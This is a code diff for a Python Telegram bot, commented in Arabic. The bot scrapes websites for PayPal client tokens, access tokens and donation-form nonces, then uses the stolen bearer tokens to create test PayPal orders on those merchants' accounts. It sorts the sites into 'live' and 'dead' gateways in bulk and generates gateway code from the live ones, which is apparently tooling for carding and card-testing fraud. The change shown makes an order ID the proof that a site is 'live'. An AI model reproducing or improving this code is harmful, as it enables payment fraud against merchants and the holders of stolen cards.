@@ -182,7 +182,7 @@ def ali_al2(massege):
 
         result = check_link(link)
         
-        if 'error' in result and 'id_form2' not in result:
+        if 'error' in result:
             bot.edit_message_text(
                 chat_id=massege.chat.id,
                 message_id=ko.message_id,
@@ -195,7 +195,7 @@ def ali_al2(massege):
         id_form2 = result['id_form2']
         nonec = result['nonec']
         au = result['au']
-        respons = result.get('respons', 'No response')
+        order_id = result.get('order_id', '')
 
     except Exception as e:
         bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
@@ -242,7 +242,7 @@ def ali_al2(massege):
         try:
             tok = response.json()['data']['id']
         except:
-            tok = ''
+            tok = order_id
         
         headers = {
             'authorization': f'Bearer {au}',
@@ -535,7 +535,7 @@ def handle_bulk_file(message):
         bot.reply_to(message, "Use /bulk first to start bulk extraction.")
 
 def check_link(link):
-    """فحص PayPal Commerce - فحص فعلي مع رد"""
+    """فحص PayPal Commerce - لازم Order ID حقيقي"""
     try:
         if not link.startswith(("http://", "https://")):
             return {'link': link, 'error': 'Invalid URL'}
@@ -564,27 +564,7 @@ def check_link(link):
 
         res = r.text
         
-        paypal_indicators = [
-            'paypal', 'PayPal', 'PAYPAL',
-            'paypal.com', 'paypalobjects.com',
-            'paypal_sdk', 'paypal-sdk',
-            'paypal.Buttons',
-            'smart-payment-buttons',
-            'client-token', 'client_token', 'clientToken',
-            'data-client-token',
-            'accessToken', 'access_token',
-            'give-form-id', 'give-form-hash',
-        ]
-        
-        has_paypal = False
-        for indicator in paypal_indicators:
-            if indicator in res:
-                has_paypal = True
-                break
-        
-        if not has_paypal:
-            return {'link': link, 'error': 'No PayPal detected'}
-        
+        # ============ البحث عن client token و accessToken ============
         enc = None
         au = None
         
@@ -617,6 +597,7 @@ def check_link(link):
                 au = match.group(1)
                 break
         
+        # فك client token
         if enc and not au:
             try:
                 padded = enc + '=' * (-len(enc) % 4)
@@ -638,6 +619,7 @@ def check_link(link):
                 except:
                     pass
         
+        # ============ البحث عن form fields ============
         id_form1 = ''
         id_form2 = ''
         nonec = ''
@@ -694,9 +676,8 @@ def check_link(link):
                         nonec = value
         
         # ============ الفحص الفعلي ============
-        response_text = ''
-        
-        if id_form2 and nonec and au:
+        # لو فيه au + form fields نحاول نعمل order
+        if au and id_form2 and nonec:
             try:
                 parsed = urlparse(link)
                 USER_URL2 = f'https://{parsed.netloc}'
@@ -734,48 +715,71 @@ def check_link(link):
                 
                 try:
                     order_id = response.json()['data']['id']
-                    response_text = f'Order ID: {order_id}'
+                    if order_id:
+                        return {
+                            'link': link,
+                            'id_form1': id_form1 or id_form2,
+                            'id_form2': id_form2,
+                            'nonec': nonec,
+                            'au': au,
+                            'respons': f'Order ID: {order_id}',
+                            'order_id': order_id
+                        }
                 except:
-                    try:
-                        error = response.json()['data']['error']
-                        response_text = f'Error: {error[:100]}'
-                    except:
-                        response_text = response.text[:100]
-            except Exception as e:
-                response_text = f'Failed: {str(e)[:100]}'
+                    pass
+            except:
+                pass
         
-        # ============ الرجوع بالبيانات ============
-        if au and id_form2 and nonec:
-            return {
-                'link': link,
-                'id_form1': id_form1 or id_form2,
-                'id_form2': id_form2,
-                'nonec': nonec,
-                'au': au,
-                'respons': response_text or 'No response'
-            }
+        # لو مفيش form fields بس فيه au - نجرب نعمل order مباشرة
+        if au and not id_form2:
+            try:
+                parsed = urlparse(link)
+                USER_URL2 = f'https://{parsed.netloc}'
+                
+                headers = {
+                    'authorization': f'Bearer {au}',
+                    'content-type': 'application/json',
+                    'user-agent': 'Mozilla/5.0',
+                }
+                
+                # محاولة create order مباشر
+                json_data = {
+                    'intent': 'CAPTURE',
+                    'purchase_units': [{
+                        'amount': {
+                            'currency_code': 'USD',
+                            'value': '1.00'
+                        }
+                    }]
+                }
+                
+                response = session.post(
+                    'https://cors.api.paypal.com/v2/checkout/orders',
+                    headers=headers,
+                    json=json_data,
+                    timeout=30,
+                    verify=False
+                )
+                
+                try:
+                    order_id = response.json()['id']
+                    if order_id:
+                        return {
+                            'link': link,
+                            'id_form1': '',
+                            'id_form2': '',
+                            'nonec': '',
+                            'au': au,
+                            'respons': f'Order ID: {order_id}',
+                            'order_id': order_id
+                        }
+                except:
+                    pass
+            except:
+                pass
         
-        if au:
-            return {
-                'link': link,
-                'id_form1': '',
-                'id_form2': '',
-                'nonec': '',
-                'au': au,
-                'respons': response_text or 'au only'
-            }
-        
-        if id_form2 and nonec:
-            return {
-                'link': link,
-                'id_form1': id_form1 or id_form2,
-                'id_form2': id_form2,
-                'nonec': nonec,
-                'au': au or '',
-                'respons': response_text or 'No au'
-            }
-        
-        return {'link': link, 'error': 'No valid data'}
+        # لو مفيش Order ID = ميت
+        return {'link': link, 'error': 'No order ID'}
     except Exception as e:
         return {'link': link, 'error': str(e)[:100]}
 
@@ -891,13 +895,15 @@ Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
             with progress['lock']:
                 progress['processed'] += 1
                 
-                if 'error' in result and 'id_form2' not in result:
+                respons = result.get('respons', '')
+                # شرط صارم: لازم Order ID
+                if ('error' in result) or ('Order ID' not in respons):
                     progress['dead'] += 1
-                    progress['current_respons'] = result.get('error', 'Dead')
+                    progress['current_respons'] = result.get('error', 'No order')
                 else:
                     progress['live'] += 1
                     live_idx = progress['live']
-                    progress['current_respons'] = result.get('respons', 'Live')
+                    progress['current_respons'] = respons
                     
                     try:
                         code = generate_gateway_code(result, live_idx, file_num)
@@ -914,7 +920,7 @@ id_form2: {result['id_form2']}
 nonec: {result['nonec']}
 au: {result['au']}</code>
 ━━━━━━━━━━━━━━━━━━━━
-💬 <b>Respons:</b> <code>{result.get('respons', 'N/A')}</code>
+💬 <b>Respons:</b> <code>{respons}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @nnunrr"""
                         send_queue.put((chat_id, file_name, caption))
